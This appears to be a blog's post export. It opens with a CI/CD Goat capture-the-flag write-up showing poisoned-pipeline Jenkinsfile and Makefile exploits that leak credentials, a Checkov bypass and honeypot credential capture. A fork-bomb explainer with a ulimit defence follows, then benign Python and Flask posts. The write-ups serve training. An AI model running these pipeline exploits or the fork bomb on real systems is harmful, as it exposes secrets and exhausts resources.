&#x27;flag1&#x27;)]) &#123;                        sh &#x27;&#x27;&#x27;                            echo &quot;$flag1&quot; | base64                        &#x27;&#x27;&#x27;                &#125;            &#125;        &#125;        stage (&#x27;Install_Requirements&#x27;) &#123;            steps &#123;                sh &quot;&quot;&quot;                    virtualenv venv                    pip3 install -r requirements.txt || true                &quot;&quot;&quot;            &#125;        &#125;        stage (&#x27;Lint&#x27;) &#123;            steps &#123;                sh &quot;pylint $&#123;PROJECT&#125; || true&quot;            &#125;        &#125;        stage (&#x27;Unit Tests&#x27;) &#123;            steps &#123;                sh &quot;pytest&quot;            &#125;        &#125;    &#125;    post &#123;        always &#123;            cleanWs()        &#125;    &#125;&#125;\n\nMad HatterRisks\nCICD-SEC-4: Poisoned Pipeline Execution (PPE)\nCICD-SEC-6: Insufficient Credential Hygiene\n\nAnalysis本题与上一题的整体攻击思路类似，唯一的不同在于，本题的 Jenkins 文件被单独放在了其它仓库，并且我们不具备它的读写权限。因此，如果你直接重复上一题的步骤，将会在修改 Jenkinsfile 后进行 git push 时被拒绝。但是通过审计 Jenkinsfile 可以发现\nstage(&#x27;make&#x27;)&#123;    steps &#123;      withCredentials([usernamePassword(credentialsId: &#x27;flag3&#x27;, usernameVariable: &#x27;USERNAME&#x27;, passwordVariable: &#x27;FLAG&#x27;)]) &#123;        sh &#x27;make || true&#x27;      &#125;    &#125;           &#125;\n\n此处 Jenkins 将执行 Makefile 中的命令，而 Makefile 的内容是我们可控的，因此可通过修改 Makefile 执行的命令间接控制 Jenkinsfile 中会执行的指令，实现间接 PPE (I-PPE)\n\nExploitwhoami:    echo &quot;$FLAG&quot; | base64\n\nDuchessRisks\nCICD-SEC-7: Insecure System Configuration\n\nAnalysis这道题其实是 Web 安全的经典题，不过也确实和云安全相关。通过题目描述和 hint 能够意识到 git 仓库可能在某一次修改中存放了 PyPI 的 token，因此使用 Githack 和 Gitleak 或者干脆手动搜索的方式搜索题目给出的关键字即可拿到 Flag\n\nExploitgit show 43f216c2268a94ff03e5400cd4ca7a11243821b0\n\nCaterpillarRisks\nCICD-SEC-4: Poisoned Pipeline Execution (PPE)\nCICD-SEC-6: Insufficient Credential Hygiene\n\nAnalysis审计 Jenkinsfile 时发现的\nstage(&#x27;deploy&#x27;) &#123;    when &#123;        expression &#123;            env.BRANCH_NAME == &#x27;main&#x27;        &#125;    &#125;    steps &#123;        withCredentials([usernamePassword(credentialsId: &#x27;flag2&#x27;, usernameVariable: &#x27;flag2&#x27;, passwordVariable: &#x27;TOKEN&#x27;)]) &#123;            sh &#x27;curl -isSL &quot;http://wonderland:1234/api/user&quot; -H &quot;Authorization: Token $&#123;TOKEN&#125;&quot; -H &quot;Content-Type: application/json&quot; || true&#x27;        &#125;    &#125;&#125;\n\n这意味着想要读取 Flag 就必须要通过 main 分支触发的 CI&#x2F;CD 流才能实现。不过这很好解决，直接把这个条件判断删除掉，但在 push时又会发现攻击者不对该仓库具有读写权限。不过这依然不是难点，我们可以通过阅读 hint 解决，也就是不直接 clone 这个仓库，而是通过 fork 它到自己的仓库空间下使自己能够对自己 fork 来的仓库可读可写，再在修改 Jenkinsfile 后为原仓库提 Pr 触发 CI&#x2F;CD 流。但是这样触发的 pipeline 输出 log 中不会有我们想要的 flag，阅读日志会发现\nERROR: Could not find credential entry with ID &#x27;flag2&#x27;\n\n事实上，在探索 Jenkins 控制台时，能够发现本题存在两条 pipeline 。而在 pr 时只会执行 wonderland-caterpillar-test 这一条 pipeline，而我们想要的 flag2 应该放在了 wonderland-caterpillar-prod 这一条 pipeline 的环境中\n\n读名字能猜出来 test 是测试环境而 prod(product) 是生产环境，它们的生产管理实践可参阅参考链接\n\n参考提示2，在测试 pipeline 中输出测试环境的所有环境变量，能够发现 GITEA_TOKEN，查阅一下它的作用，能够发现通过在 HTTP 标准认证使用它，攻击者就能够对上游源代码仓库进行读写，进而实现公共 PPE (Public-PPE &#x2F; 3PE) 攻击\n\nExploit在测试环境中\npipeline &#123;    agent any    environment &#123;        PROJECT = &quot;loguru&quot;    &#125;    stages &#123;        stage (&#x27;Read_Env&#x27;) &#123;            steps &#123;                sh &quot;&quot;&quot;                    env                &quot;&quot;&quot;            &#125;        &#125;    &#125;    post &#123;        always &#123;            cleanWs()        &#125;    &#125;&#125;\n\n在生产环境中\nstage(&#x27;deploy&#x27;) &#123;    steps &#123;        withCredentials([usernamePassword(credentialsId: &#x27;flag2&#x27;, usernameVariable: &#x27;flag2&#x27;, passwordVariable: &#x27;TOKEN&#x27;)]) &#123;            sh &#x27;echo $TOKEN | base64&#x27;        &#125;    &#125;&#125;\n\nCheshire CatRisks\nCICD-SEC-4: Poisoned Pipeline Execution (PPE)\nCICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)\nCICD-SEC-6: Insufficient Credential Hygiene\n\nAnalysis这题照着 hint 做就行，直接 PPE 即可，与第一题的不同在于根据题目描述能够得知 flag 放在了用户根目录下，以及需要在 Jenkinsfile 的 agent 字段指定内置节点标签，搜索一下得知标签名为 built-in\nExploitpipeline &#123;    agent &#123; label &#x27;built-in&#x27; &#125; // This specifies the job will run on the Jenkins Controller    stages &#123;        stage(&#x27;Read and Print File&#x27;) &#123;            steps &#123;                sh &#x27;cat ~/flag5.txt&#x27;            &#125;        &#125;    &#125;&#125;\n\nTwiddledumRisks\nCICD-SEC-3: Dependency Chain Abuse\n\nAnalysisToDo (npm 没配镜像开摆了没做)大体上通过攻击目标仓库的依赖仓库实现供应链投毒，进而对目标仓库进行 I-PPE攻击原理参阅参考链接\n\nExploitDodoRisks\nCICD-SEC-1: Insufficient Flow Control Mechanisms\n\nAnalysisHint 给出了参考资料（Malicious Code Analysis并建议了解 Checkov，后者是一个开源静态分析工具，旨在帮助开发人员和 DevOps 团队发现并修复基础设施即代码（IaC）中的安全和合规性问题。由 Bridgecrew 开发，支持各种IaC框架，包括Terraform，CloudFormation，Kubernetes，ARM模板等。它扫描IaC文件以识别错误配置、潜在漏洞以及对最佳实践的遵守情况。不出意外本题需要利用它的漏洞实现攻击或需要对它进行某种 Bypass。\n在 Jenkins 控制台的输出中攻击者能够发现 Checkov 的扫描目标与扫描的配置\n\n按照题目描述，本题需要创建 .checkov.yml 以自定义 Checkov 的行为，令其扫描本项目的配置文件时忽略 s3 bucket 公开可见这一配置不当实现 Bypass。具体步骤为修改 main.tf 令 S3 bucket 公开可见，并配置 .checkov.yml 忽略对其进行的扫描\n\n成功获得 flag\n\nAWS S3 bucket 的配置文件的更多信息见参考链接\n\nExploitmain.tf 中修改该行\nresource &quot;aws_s3_bucket_acl&quot; &quot;data&quot; &#123;  bucket = aws_s3_bucket.private_acl_v4.id-  acl    = &quot;public-read&quot;+  acl    = &quot;private&quot;&#125;\n\n在 .checkov.yml 中写入\nsoft-fail: truecheck:  - THIS_NOT_THE_CHECK_YOUR_ARE_LOOKING_FOR\n\nHeartsRisks\nCICD-SEC-1: Insufficient Flow Control Mechanisms\n\nAnalysis按照 hint 可爆破得到结点管理员的账号和密码。结点管理员可建立结点，而这些结点能够通过 SSH 服务互相连接，同时连接的目标可以由结点管理员指定。因此攻击者可以创建新的结点并指定结点去连接 SSH 蜜罐，进而获取结点使用的 SSH 用户名与密码，从而实现横向或纵向的进一步渗透\nExploit#使用任意 SSH 蜜罐皆可docker run -p 2222:2222 cowrie/cowrie\n\nDormouseRisksAnalysisTODO 本题环境疑似有些残缺，没做\nExploitMock TurtleRisks\nCICD-SEC-1: Insufficient Flow Control Mechanisms\nCICD-SEC-4: Poisoned Pipeline Execution (PPE)\nCICD-SEC-6: Insufficient Credential Hygiene\n\nAnalysis挺传统 CTF 的一道题，先审计 Jenkinsfile\npipeline &#123;    agent any    stages &#123;        stage(&#x27;pr_checks&#x27;) &#123;            steps &#123;                withCredentials([usernamePassword(credentialsId: &#x27;mock-turtle-token&#x27;, usernameVariable: &#x27;USERNAME&#x27;, passwordVariable: &#x27;TOKEN&#x27;)]) &#123;                    sh &#x27;&#x27;&#x27;                        PR_ID=`echo &quot;$CHANGE_URL&quot; | grep -Po &#x27;^http://gitea:3000/Wonderland/mock-turtle/pulls/\\\\K\\\\d+$&#x27;`                        if [ $? -eq 0 ];                        then                            gitp=`git diff --word-diff=porcelain origin/$&#123;CHANGE_TARGET&#125; | grep -e &quot;^+[^+]&quot; | wc -w | xargs`                            gitm=`git diff --word-diff=porcelain origin/$&#123;CHANGE_TARGET&#125; | grep -e &quot;^-[^-]&quot; | wc -w | xargs`                                  if [ $(($gitp - $gitm)) -eq 0 ] ; then check1=true; else check1=false; fi                            if [ $(wc -l &lt;version) -eq 0 -a $(grep -Po &quot;^\\\\d&#123;1,2&#125;\\\\.\\\\d&#123;1,2&#125;\\\\.\\\\d&#123;1,2&#125;$&quot; version) ] ; then check2=true; else check2=false; fi                            if [ $(git diff --name-only origin/$&#123;CHANGE_TARGET&#125; | grep version) ] ; then check3=true; else check3=false; fi                            if $check1 &amp;&amp; $check2 &amp;&amp; $check3;                            then                                curl -X &#x27;POST&#x27; \\                                &#x27;http://gitea:3000/api/v1/repos/Wonderland/mock-turtle/pulls/&#x27;&quot;$PR_ID&quot;&#x27;/merge&#x27; \\                                -H &#x27;accept: application/json&#x27;\\                                -H &#x27;Content-Type: application/json&#x27; \\                                -H &#x27;Authorization: token &#x27;&quot;$TOKEN&quot; \\                                -d &#x27;&#123;                                    &quot;Do&quot;: &quot;merge&quot;                                &#125;&#x27;;                            else                                echo &#x27;skipping...&#x27;;                            fi                        fi                    &#x27;&#x27;&#x27;                &#125;            &#125;        &#125;    &#125;&#125;\n\n可以发现本题可以进行 D-PPE 攻击，不过通过 Pr 修改 Jenkinsfile 进行 D-PPE 攻击时需要先通过 pipeline 的 Pr check，具体上是 3 个检查\n\n增加的单词数和减少的单词数必须相同\nversion文件只有一行，并且符合x.y.z的格式\nversion 文件内容发生了更改\n\n修改 Jenkinsfile 后去别的文件里增加 Jenkinsfile 里减少的字符数相等的字符数再让 version 文件的小版本号 +1 即可\nExploitpipeline &#123;    agent any    stages &#123;        stage(&#x27;pr_checks&#x27;) &#123;            steps &#123;                withCredentials([usernamePassword(credentialsId: &#x27;flag10&#x27;, usernameVariable: &#x27;flag10&#x27;, passwordVariable: &#x27;TOKEN&#x27;)]) &#123;                    sh &#x27;echo $TOKEN | base64&#x27;                &#125;            &#125;        &#125;    &#125;&#125;\n\nGrythonRisksAnalysisToDo 还没做\nExploitReferenceCI&#x2F;CD GOATOWASP Top 10 CI&#x2F;CD Security RisksWhat is CI&#x2F;CD?OWASP CI&#x2F;CD Security Cheat SheetDevSecOps OutlineJenkinsfile SyntaxPPEsf4ult’s wp(gif 图来源)Intro to pipeline automationDependency ManagementS3 BucketCheckov\n","categories":["Tech Blog"]},{"title":"ForkBomb","url":"/2023/08/07/Tech%20Blog/ForkBomb/","content":"简介ForkBomb可通过创建大量进程消耗大量的系统资源，从而拖慢系统与正常进程的运行速度，增大响应时间，使得操作系统的正常运作受到较大影响\n\n\nForkBomb原理解析一个非常经典的ForkBomb为\n:()&#123; :|: &amp; &#125;;:\n\n这其实是一个扁平化的表达式，它可以格式化为\n:()&#123;    :|: &amp;&#125;;:\n\n因为在 Bash 中，:、.、&#x2F; 等一些字符也能够被用于函数命名，因此，上面的代码按照更常规的写法其实等价于：\nfunc()&#123;    func | func &amp;&#125;;func\n\nForkBomb的核心是函数体执行的 func | func &amp; ，它代表的操作是\n\n递归执行func 函数\n使用管道|把前一个func函数的返回值传给第二个func函数\n第二个func函数通过&amp;标志将会在后台执行，且fork出的子进程在父进程被回收时不会被回收ForkBomb的执行结果是创建两个函数实例，然后不断地递归调用使得实例数量指数式增长，最终耗尽系统所有资源\n\n防御手段\n修改系统配置，设置一个用户拥有的进程数上限，例如ulimit -u 77限制用户最多拥有77个进程\n\nReferencehttps://en.wikipedia.org/wiki/Fork_bomb\n","categories":["Tech Blog"]},{"title":"PythonTips (不定时更新)","url":"/2023/08/01/Tech%20Blog/PythonTips/","content":"PythonTipsTip1 - 整数比较的坑在 Python 中一切都是对象，整数也是对象，在比较两个整数时有两个运算符==和is，它们的区别是：\n\nis比较的是两个整数对象的id值是否相等，也就是比较两个引用是否代表了内存中同一个地址。\n==比较的是两个整数对象的内容是否相等，使用==时其实是调用了对象的__eq__()方法。\n以CPython解释器为例，如果运行了以下代码\n\ndef main():    x = y = -1    while True:        x += 1        y += 1        if x is y:            print(&#x27;%d is %d&#x27; % (x, y))        else:            print(&#x27;Attention! %d is not %d&#x27; % (x, y))            break                x = y = 0    while True:        x -= 1        y -= 1        if x is y:            print(&#x27;%d is %d&#x27; % (x, y))        else:            print(&#x27;Attention! %d is not %d&#x27; % (x, y))            breakif __name__ == &#x27;__main__&#x27;:    main()\n\n上面代码的部分运行结果如下。这个结果是因为CPython出于性能优化的考虑，把频繁使用的整数对象用一个叫small_ints的对象池缓存起来造成的。small_ints缓存的整数值被设定为[-5, 256]这个区间，也就是说，如果使用CPython解释器，在任何引用这些整数的地方，都不需要重新创建int对象，而是直接引用缓存池中的对象。如果整数不在该范围内，那么即便两个整数的值相同，它们也是不同的对象。\n0 is 01 is 12 is 23 is 3...254 is 254255 is 255256 is 256Attention! 257 is not 257-1 is -1-2 is -2-3 is -3-4 is -4-5 is -5Attention! -6 is not -6\n\n再看看下面的代码。\na = 257def main():    b = 257  # 第6行    c = 257  # 第7行    print(b is c)  # True    print(a is b)  # False    print(a is c)  # Falseif __name__ == &quot;__main__&quot;:    main()\n\n程序的执行结果已经用注释写在代码上了。看上去a、b和c的值都是一样的，但是is运算的结果却不一样。为什么会出现这样的结果，首先是Python程序中的代码块。所谓代码块是程序的一个最小的基本执行单位，一个模块文件、一个函数体、一个类、交互式命令中的单行代码都叫做一个代码块。上面的代码由两个代码块构成，a = 257是一个代码块，main函数是另外一个代码块。CPython底层为了进一步提升性能还做了一个设定：对于同一个代码块中值不在small_ints缓存范围之内的整数，如果同一个代码块中已经存在一个值与其相同的整数对象，那么就直接引用该对象，否则创建新的int对象。需要注意的是，这条规则对数值型适用，但对字符串则需要考虑字符串的长度，这一点可以自行证明。为了验证刚刚的结论，借用dis模块（进行反汇编的模块）从字节码的角度来看看这段代码。关于字节码，可以先看看《谈谈 Python 程序的运行原理》这篇文章。可以先用import dis导入dis模块并按照如下所示的方式修改代码。\nimport disdis.dis(main)\n\n代码的执行结果可以看出代码第6行和第7行，也就是main函数中的257是从同一个位置加载的，因此是同一个对象；而代码第9行的a明显是从不同的地方加载的，因此引用的是不同的对象。\n更详细的讨论在《Python整数对象实现原理》这篇文章可以看到。\nTip2 - 嵌套列表Python中有一种内置的数据类型叫列表，它是一种容器，可以用来承载其他的对象（准确的说是其他对象的引用），列表中的对象可以称为列表的元素，很明显我们可以把列表作为列表中的元素，这就是所谓的嵌套列表。嵌套列表可以模拟出现实中的表格、矩阵、2D游戏的地图（如植物大战僵尸的花园）、棋盘（如国际象棋、黑白棋）等。但是在使用嵌套的列表时可能遭遇非常尴尬的情况，比如：\nnames = [&#x27;关羽&#x27;, &#x27;张飞&#x27;, &#x27;赵云&#x27;, &#x27;马超&#x27;, &#x27;黄忠&#x27;]subjs = [&#x27;语文&#x27;, &#x27;数学&#x27;, &#x27;英语&#x27;]scores = [[0] * 3] * 5for row, name in enumerate(names):    print(&#x27;请输入%s的成绩&#x27; % name)    for col, subj in enumerate(subjs):        scores[row][col] = float(input(subj + &#x27;: &#x27;))        print(scores)\n\n我们希望录入5个学生3门课程的成绩，于是定义了一个有5个元素的列表，而列表中的每个元素又是一个由3个元素构成的列表，这样一个列表的列表刚好跟一个表格是一致的，相当于有5行3列，接下来我们通过嵌套的for-in循环输入每个学生3门课程的成绩。程序执行完成后我们发现，每个学生3门课程的成绩是一模一样的，而且就是最后录入的那个学生的成绩。\n要想把这个坑填平，我们首先要区分对象和对象的引用这两个概念，而要区分这两个概念，还得先说说内存中的栈和堆。我们经常会听人说起“堆栈”这个词，但实际上“堆”和“栈”是两个不同的概念。众所周知，一个程序运行时需要占用一些内存空间来存储数据和代码，那么这些内存从逻辑上又可以做进一步的划分。对底层语言（如C语言）有所了解的程序员大都知道，程序中可以使用的内存从逻辑上可以为五个部分，按照地址从高到低依次是：栈（stack）、堆（heap）、数据段（data segment）、只读数据段（static area）和代码段（code segment）。其中，栈用来存储局部、临时变量，以及函数调用时保存现场和恢复现场需要用到的数据，这部分内存在代码块开始执行时自动分配，代码块执行结束时自动释放，通常由编译器自动管理；堆的大小不固定，可以动态的分配和回收，因此如果程序中有大量的数据需要处理，这些数据通常都放在堆上，如果堆空间没有正确的被释放会引发内存泄露的问题，而像Python、Java等编程语言都使用了垃圾回收机制来实现自动化的内存管理（自动回收不再使用的堆空间）。所以下面的代码中，变量a并不是真正的对象，它是对象的引用，相当于记录了对象在堆空间的地址，通过这个地址我们可以访问到对应的对象；同理，变量b是列表容器的引用，它引用了堆空间上的列表容器，而列表容器中并没有保存真正的对象，它保存的也仅仅是对象的引用。\n a = object()b = [&#x27;apple&#x27;, &#x27;pitaya&#x27;, &#x27;grape&#x27;]\n\n知道了这一点，我们可以回过头看看刚才的程序，我们对列表进行[[0] * 3] * 5操作时，仅仅是将[0, 0, 0]这个列表的地址进行了复制，并没有创建新的列表对象，所以容器中虽然有5个元素，但是这5个元素引用了同一个列表对象，这一点可以通过id函数检查scores[0]和scores[1]的地址得到证实。所以正确的代码应该按照如下的方式进行修改。\nnames = [&#x27;关羽&#x27;, &#x27;张飞&#x27;, &#x27;赵云&#x27;, &#x27;马超&#x27;, &#x27;黄忠&#x27;]subjs = [&#x27;语文&#x27;, &#x27;数学&#x27;, &#x27;英语&#x27;]scores = [[]] * 5for row, name in enumerate(names):    print(&#x27;请输入%s的成绩&#x27; % name)    scores[row] = [0] * 3    for col, subj in enumerate(subjs):        scores[row][col] = float(input(subj + &#x27;: &#x27;))        print(scores)\n\n或者\nnames = [&#x27;关羽&#x27;, &#x27;张飞&#x27;, &#x27;赵云&#x27;, &#x27;马超&#x27;, &#x27;黄忠&#x27;]subjs = [&#x27;语文&#x27;, &#x27;数学&#x27;, &#x27;英语&#x27;]scores = [[0] * 3 for _ in range(5)]for row, name in enumerate(names):    print(&#x27;请输入%s的成绩&#x27; % name)    scores[row] = [0] * 3    for col, subj in enumerate(subjs):        scores[row][col] = float(input(subj + &#x27;: &#x27;))        print(scores)\n\n如果对内存的使用不是很理解，可以看看PythonTutor网站上提供的代码可视化执行功能，通过可视化执行，我们可以看到内存是如何分配的，从而避免在使用嵌套列表或者复制对象时可能遇到的坑。\nTip3 - 访问修饰符Python的类提供了两种访问控制权限，一种是公开，一种是私有（在属性或方法前加上双下划线）。而用惯了Java或C#这类编程语言的人都知道，类中的属性（数据抽象）通常都是私有的，其目的是为了将数据保护起来；而类中的方法（行为抽象）通常都是公开的，因为方法是对象向外界提供的服务。但是Python并没有从语法层面确保私有成员的私密性，因为它只是对类中所谓的私有成员进行了命名的变换，如果知道命名的规则照样可以直接访问私有成员，请看下面的代码。\nclass Student(object):    def __init__(self, name, age):        self.__name = name        self.__age = age    def __str__(self):        return self.__name + &#x27;: &#x27; + str(self.__age)stu = Student(&#x27;Tom&#x27;, 7)print(stu._Student__name)print(stu._Student__age)\n\nPython为什么要做出这样的设定？用一句广为流传的格言来解释这个问题：“We are all consenting adults here”（我们都是成年人）。这句话表达了很多Python程序员的一个共同观点，那就是开放比封闭要好，我们应该自己对自己的行为负责而不是从语言层面来限制对数据或方法的访问。\n所以在Python中我们实在没有必要将类中的属性或方法用双下划线开头的命名处理成私有的成员，因为这并没有任何实际的意义。如果想对属性或方法进行保护，我们建议用单下划线开头的受保护成员，虽然它也不能真正保护这些属性或方法，但是它相当于给调用者一个暗示，让调用者知道这是不应该直接访问的属性或方法，而且这样做并不影响子类去继承这些东西。\n需要注意的是，Python类中的那些魔法方法，如__str__、__repr__等，这些方法并不是私有成员，虽然它们以双下划线开头，但是他们也是以双下划线结尾的，这种命名并不是私有成员的命名。\n","categories":["Tech Blog"]},{"title":"Python 之禅","url":"/2023/07/23/Tech%20Blog/Python%E4%B9%8B%E7%A6%85/","content":"Zen of Python（Python之禅）\nBeautiful is better than ugly. （优美比丑陋好）\nExplicit is better than implicit.（清晰比晦涩好）\nSimple is better than complex.（简单比复杂好）\nComplex is better than complicated.（复杂比错综复杂好）\nFlat is better than nested.（扁平比嵌套好）\nSparse is better than dense.（稀疏比密集好）\nReadability counts.（可读性很重要）\nSpecial cases aren’t special enough to break the rules.（特殊情况也不应该违反这些规则）\nAlthough practicality beats purity.（但现实往往并不那么完美）\nErrors should never pass silently.（异常不应该被静默处理）\nUnless explicitly silenced.（除非你希望如此）\nIn the face of ambiguity, refuse the temptation to guess.（遇到模棱两可的地方，不要胡乱猜测）\nThere should be one– and preferably only one –obvious way to do it.（肯定有一种通常也是唯一一种最佳的解决方案）\nAlthough that way may not be obvious at first unless you’re Dutch.（虽然这种方案并不是显而易见的，因为你不是那个荷兰人[^1]）\nNow is better than never.（现在开始做比不做好）\nAlthough never is often better than *right* now.（不做比盲目去做好[^2]）\nIf the implementation is hard to explain, it’s a bad idea.（如果一个实现方案难于理解，它通常不是一个好的方案）\nIf the implementation is easy to explain, it may be a good idea.（如果一个实现方案易于理解，它很有可能是一个好的方案）\nNamespaces are one honking great idea – let’s do more of those!（命名空间非常有用，我们应当多加利用）\n\n[^1]:这里指的是 Python 之父 Guido van Rossumm。[^2]:极限编程中的YAGNI原则\n","categories":["Tech Blog"]},{"title":"RE:从0开始阅读Flask源码 Ⅱ","url":"/2024/04/11/Tech%20Blog/RE-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BBFlask%E6%BA%90%E7%A0%81-%E2%85%A1/","content":"我们已经基本理解了 Flask 的框架原理，即 Flask 通过与 WerkZeug WSGI 框架进行交互实现 HTTP Web Server 所需要具备的功能，但这些框架原理的讨论实际上是将 Flask 框架视作为一个黑箱，或者说视作了 Web Application Framework 的一个实例为前提进行的。我们所探究的是较为一般的 Web Application Framework 与 HTTP Server 如何协同工作从而实现 Web Server 的方式，并基本了解了 Flask 如何作为 Web Application Framework 与 WSGI 交互以启动 WebServer 的。但我们仍不了解 Flask 在抛开 Web Application Framework 所需要做的基本工作以外，其工作流具体是什么样的。我们将路由匹配，上下文，异常处理的具体实现暂时忽略，单纯的从 Flask 接收到请求并响应的工作流程这一抽象层级上来看看 Flask 是如何工作的\n\n\n请求处理首先我们知道，当 WerkZeug 获取到一个 HTTP 请求后，会通过 WSGI 接口以调用 Flask 实例的 __call__ 方法的方式将该请求传递给 Flask\ndef __call__(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:    &quot;&quot;&quot;The WSGI server calls the Flask application object as the    WSGI application. This calls :meth:`wsgi_app`, which can be    wrapped to apply middleware.    &quot;&quot;&quot;    return self.wsgi_app(environ, start_response)\n\n随后，__call__ 方法会通过调用 wsgi_app 方法进行处理\ndef wsgi_app(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:    &quot;&quot;&quot;The actual WSGI application. This is not implemented in    :meth:`__call__` so that middlewares can be applied without    losing a reference to the app object. Instead of doing this::        app = MyMiddleware(app)    It&#x27;s a better idea to do this instead::        app.wsgi_app = MyMiddleware(app.wsgi_app)    Then you still have the original application object around and    can continue to call methods on it.    .. versionchanged:: 0.7        Teardown events for the request and app contexts are called        even if an unhandled error occurs. Other events may not be        called depending on when an error occurs during dispatch.        See :ref:`callbacks-and-errors`.    :param environ: A WSGI environment.    :param start_response: A callable accepting a status code,        a list of headers, and an optional exception context to        start the response.    &quot;&quot;&quot;    ctx = self.request_context(environ)    error: BaseException | None = None    try:        try:            ctx.push()            response = self.full_dispatch_request()        except Exception as e:            error = e            response = self.handle_exception(e)        except:  # noqa: B001            error = sys.exc_info()[1]            raise        return response(environ, start_response)    finally:        if &quot;werkzeug.debug.preserve_context&quot; in environ:            environ[&quot;werkzeug.debug.preserve_context&quot;](_cv_app.get())            environ[&quot;werkzeug.debug.preserve_context&quot;](_cv_request.get())        if error is not None and self.should_ignore_error(error):            error = None        ctx.pop(error)\n\n忽略掉异常处理与上下文部分的逻辑，wsgi_app 方法的功能就是通过调用其它方法针对获取到的请求生成并返回 response 。而如果没有出现异常情况，这一 response 会通过 full_dispatch_request 方法进行请求调度后生成\n\n在这段代码的注释中 Flask 框架的开发团队写下了他们在此处进行的设计理念。为什么 Flask 不直接在 __call__ 方法中就进入到处理流程，而是要让 __call__ 方法调用 wsgi_app 方法，再在 wsgi_app 方法中进行处理。其目的是为了解耦以提高框架的可拓展性。如果直接通过 __call__ 方法进行处理，那么中间件需要重载 __call__ 方法，即用一个新的类继承 Flask 类来达到目的\napp = MyMiddleware(app)\n\n而 Flask 框架的开发团队认为更好的拓展方式应该是\napp.wsgi_app = MyMiddleware(app.wsgi_app)\n\n这样，中间件的开发者就可以保持着对原本的 Flask 类实例的引用进行接下来的开发\n\ndef full_dispatch_request(self) -&gt; Response:    &quot;&quot;&quot;Dispatches the request and on top of that performs request    pre and postprocessing as well as HTTP exception catching and    error handling.    .. versionadded:: 0.7    &quot;&quot;&quot;    self._got_first_request = True    try:        request_started.send(self, _async_wrapper=self.ensure_sync)        rv = self.preprocess_request()        if rv is None:            rv = self.dispatch_request()    except Exception as e:        rv = self.handle_user_exception(e)    return self.finalize_request(rv)\n\nfull_dispatch_request 方法首先会标记自身已处理过一个请求，以便有着针对接收到的第一个请求进行特殊处理需求的业务对此进行拓展。在发送了请求到达信号后，full_dispatch_request 方法会通过 preprocess_request 方法对到达的请求进行预处理\ndef preprocess_request(self) -&gt; ft.ResponseReturnValue | None:    &quot;&quot;&quot;Called before the request is dispatched. Calls    :attr:`url_value_preprocessors` registered with the app and the    current blueprint (if any). Then calls :attr:`before_request_funcs`    registered with the app and the blueprint.    If any :meth:`before_request` handler returns a non-None value, the    value is handled as if it was the return value from the view, and    further request handling is stopped.    &quot;&quot;&quot;    names = (None, *reversed(request.blueprints))    for name in names:        if name in self.url_value_preprocessors:            for url_func in self.url_value_preprocessors[name]:                url_func(request.endpoint, request.view_args)    for name in names:        if name in self.before_request_funcs:            for before_func in self.before_request_funcs[name]:                rv = self.ensure_sync(before_func)()                if rv is not None:                    return rv  # type: ignore[no-any-return]    return None\n\n进行的预处理操作来自于蓝图与通过 before_first_request 与 before_request 两个方法进行注册的预处理 Hook 函数。若所有预处理 Hook 函数执行完毕后返回值都为 None ，则 preprocess_request 方法也会返回 None ，full_dispatch_request 方法会通过 dispatch_request 方法进行路由分发。\n路由分发def dispatch_request(self) -&gt; ft.ResponseReturnValue:    &quot;&quot;&quot;Does the request dispatching.  Matches the URL and returns the    return value of the view or error handler.  This does not have to    be a response object.  In order to convert the return value to a    proper response object, call :func:`make_response`.    .. versionchanged:: 0.7       This no longer does the exception handling, this code was       moved to the new :meth:`full_dispatch_request`.    &quot;&quot;&quot;    req = request_ctx.request    if req.routing_exception is not None:        self.raise_routing_exception(req)    rule: Rule = req.url_rule  # type: ignore[assignment]    # if we provide automatic options for this URL and the    # request came with the OPTIONS method, reply automatically    if (        getattr(rule, &quot;provide_automatic_options&quot;, False)        and req.method == &quot;OPTIONS&quot;    ):        return self.make_default_options_response()    # otherwise dispatch to the handler for that endpoint    view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]\n\ndispatch_request 方法会通过上下文获取接收到的请求，若该请求无 URL 路由异常，即无 routing_exception ，则根据 URL 规则的 endpoint 执行相应的视图函数，视图函数如 Flask Demo 所示通过 route 方法进行注册。视图函数执行完毕则向上传递视图函数的返回值给 full_dispatch_request 方法\ndef full_dispatch_request(self) -&gt; Response:    ...    return self.finalize_request(rv)\n\n最后，在以上流程无异常的情况下， full_dispatch_request 方法通过 finalize_request 方法接受视图函数的返回值并生成响应\n响应生成def finalize_request(    self,    rv: ft.ResponseReturnValue | HTTPException,    from_error_handler: bool = False,) -&gt; Response:    &quot;&quot;&quot;Given the return value from a view function this finalizes    the request by converting it into a response and invoking the    postprocessing functions.  This is invoked for both normal    request dispatching as well as error handlers.    Because this means that it might be called as a result of a    failure a special safe mode is available which can be enabled    with the `from_error_handler` flag.  If enabled, failures in    response processing will be logged and otherwise ignored.    :internal:    &quot;&quot;&quot;    response = self.make_response(rv)    try:        response = self.process_response(response)        request_finished.send(            self, _async_wrapper=self.ensure_sync, response=response        )    except Exception:        if not from_error_handler:            raise        self.logger.exception(            &quot;Request finalizing failed with an error while handling an error&quot;        )    return response\n\nfinalize_request 主要做两件事，首先，它会通过 make_response 方法将视图函数的返回值封装为 HTTP 响应\ndef make_response(self, rv: ft.ResponseReturnValue) -&gt; Response:    &quot;&quot;&quot;Convert the return value from a view function to an instance of    :attr:`response_class`.    :param rv: the return value from the view function. The view function        must return a response. Returning ``None``, or the view ending        without returning, is not allowed. The following types are allowed        for ``view_rv``:        ``str``            A response object is created with the string encoded to UTF-8            as the body.        ``bytes``            A response object is created with the bytes as the body.        ``dict``            A dictionary that will be jsonify&#x27;d before being returned.        ``list``            A list that will be jsonify&#x27;d before being returned.        ``generator`` or ``iterator``            A generator that returns ``str`` or ``bytes`` to be            streamed as the response.        ``tuple``            Either ``(body, status, headers)``, ``(body, status)``, or            ``(body, headers)``, where ``body`` is any of the other types            allowed here, ``status`` is a string or an integer, and            ``headers`` is a dictionary or a list of ``(key, value)``            tuples. If ``body`` is a :attr:`response_class` instance,            ``status`` overwrites the exiting value and ``headers`` are            extended.        :attr:`response_class`            The object is returned unchanged.        other :class:`~werkzeug.wrappers.Response` class            The object is coerced to :attr:`response_class`.        :func:`callable`            The function is called as a WSGI application. The result is            used to create a 